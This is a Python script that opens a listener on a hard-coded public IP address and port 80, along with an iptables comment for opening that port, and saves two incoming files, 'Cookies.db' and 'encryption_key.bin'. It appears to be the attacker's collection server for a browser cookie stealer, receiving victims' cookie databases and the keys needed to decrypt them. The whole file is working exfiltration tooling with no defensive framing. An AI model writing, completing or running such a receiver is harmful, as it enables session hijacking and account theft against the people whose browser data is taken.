import socket
import struct
import sys

# IPTABLES Command: iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT


def receive_files():
    ip_address = '139.162.253.129'  # Replace with the server's IP address
    port = 80  # Replace with the port you want to listen on

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Set SO_REUSEADDR option
    server_socket.bind((ip_address, port))
    server_socket.listen(1)

    print("Listening for incoming connections on {}:{}".format(ip_address, port))

    try:
        client_socket, client_address = server_socket.accept()
        print("Accepted connection from {}:{}".format(client_address[0], client_address[1]))

        # Receive the cookies file
        cookies_size_bytes = client_socket.recv(4)
        cookies_size = struct.unpack('I', cookies_size_bytes)[0]
        cookies_data = b''
        while len(cookies_data) < cookies_size:
            cookies_data += client_socket.recv(cookies_size - len(cookies_data))

        cookies_file = 'Cookies.db'
        with open(cookies_file, 'wb') as file:
            file.write(cookies_data)

        print("Received {} successfully.".format(cookies_file))

        # Receive the key file
        key_size_bytes = client_socket.recv(4)
        key_size = struct.unpack('I', key_size_bytes)[0]
        key_data = b''
        while len(key_data) < key_size:
            key_data += client_socket.recv(key_size - len(key_data))

        key_file = 'encryption_key.bin'
        with open(key_file, 'wb') as file:
            file.write(key_data)

        print("Received {} successfully.".format(key_file))

        client_socket.close()

    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Exiting...")
        sys.exit(0)

    finally:
        server_socket.close()


receive_files()
